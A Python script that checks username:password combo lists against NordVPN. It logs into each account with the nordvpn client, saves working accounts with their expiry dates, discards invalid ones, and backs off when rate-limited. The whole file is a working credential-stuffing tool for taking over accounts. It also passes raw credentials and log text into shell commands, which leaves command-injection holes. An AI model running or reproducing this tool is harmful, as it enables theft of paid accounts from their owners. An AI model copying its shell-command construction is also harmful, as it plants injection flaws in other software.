from array import array
from time import sleep
import subprocess
import re
from datetime import datetime
import os
from os import path

outFile = "verified.txt"
accPath = "acc/"
accFile = "acc.txt"
invalidAccFile = "invalid.txt"
otherAccFile = "other.txt"
rateLimitLogFile = "rate.log"
dTime = 5
downTime = dTime
errLogFile = "err.log"
checkCount = 10

invalidAccs = open(invalidAccFile, "r").read()
validAccs = open(outFile, "r").read()


def log(msg: str):
    msg = str(msg).replace('"', '`')
    os.system('echo "'+msg+'"')


def processData(rData: array = []) -> array:
    clearRes1 = [i for i in rData if not i.strip() == ""]
    clearRes2 = [i for i in clearRes1 if len(i.split(":")) > 1]
    processRes = []
    for i in clearRes2:
        clearU = i.strip().split(":")[0].strip()
        clearP = i.strip().replace(f"{clearU}:", "").strip()
        if processRes.__contains__([clearU, clearP]) or invalidAccs.__contains__(f"{clearU}:{clearP}") or validAccs.__contains__(f"{clearU}:{clearP}"):
            continue
        processRes.append([clearU, clearP])
    return processRes


log("starting nord checker")
rawData = open(accFile, "r").read().split("\n") if path.exists(accFile) else []
if path.exists(accPath):
    for fileName in os.listdir(accPath):
        if fileName == ".gitkeep":
            continue
        filePath = accPath+fileName
        rawData.extend(open(filePath, "r").read().strip().split("\n"))
        os.remove(filePath)

mainData = processData(rawData)
lastChecked = open(invalidAccFile, "r").read().strip().split("\n")[-1]
log(f"found {len(mainData)} accounts, checking {checkCount if len(mainData) >=checkCount else len(mainData) } accounts...")


newData = []
for u, p in mainData:
    newData.append(f"{u}:{p}")


def dataShift():
    newData.pop(0)
    open(accFile, "w").write("\n".join(newData))


unsort = []
i = 0
count = 0

while i < checkCount:
    if i >= len(mainData):
        break
    user, pas = mainData[i]
    # log(f"{count}) checking: {user}:{pas}")
    res, opt = subprocess.getstatusoutput(
        f"nordvpn login --username '{user}' --password '{pas}'")
    out = opt.strip().split('\n')[-1].split('Please try again.')[0].strip()
    if res == 0:
        dataShift()
        count += 1
        i += 1
        downTime = dTime

        data = os.popen('nordvpn account').read()
        data = data.split('Account Information:')[1]
        data = data.split('Email Address: ')[1]
        email, data = data.rstrip().split('VPN Service: ')

        if not data[0] == 'I':
            log(f"{count}) Verified: {data} | {user}:{pas}")
            unsort.append({'Account': user+':'+pas, 'Expires': str(data)})
            open(outFile, "a").write(f"{data} | {user}:{pas}\n")
        else:
            log(f"{count}) {user}:{pas} | {str(data).strip()}")
            open(otherAccFile, "a").write(f"{user}:{pas} | {data.strip()}\n")

        sleep(30)
        c, o = subprocess.getstatusoutput('nordvpn logout')
        o = str(o).strip().split("\n")[-1].strip()
        if c == 0 or o.__contains__("You are logged out."):
            log(f"{count}) logot account {user} success")
        else:
            open(errLogFile, "a").write(
                f"{count}) {user}:{pas} | logout error: {o}")
            log(f"{count}) logout: {o}")
        if i <= len(mainData):
            sleep(30)
    else:
        if out.lower().__contains__("We're having trouble reaching our servers".lower()):
            log(f"{count}) {user} Get ratelimit, sleep for {downTime} minutes")
            open(rateLimitLogFile, "a").write(f"{user}:{pas}\n")
            sleep(60*downTime)
            downTime += 5
        else:
            i += 1
            count += 1
            dataShift()
            downTime = dTime
            open(invalidAccFile, "a").write(f"{user}:{pas} | {out}\n")
            log(f"{count}) {user}:{pas} | {out}")
            if i <= len(mainData):
                sleep(30)

if not len(unsort) == 0:
    log("\n\n============================\nActive Account (Sort as Time):")
    sort = sorted(
        unsort,
        key=lambda x: datetime.strptime(re.sub(r"(st|th|nd|rd)", "", x['Expires']), 'Active (Expires on %b %d, %Y)'), reverse=True)
    for p in sort:
        log(f"{p['Account']} \t {p['Expires']}")
else:
    log("\n\n============================\nActive Account not found")
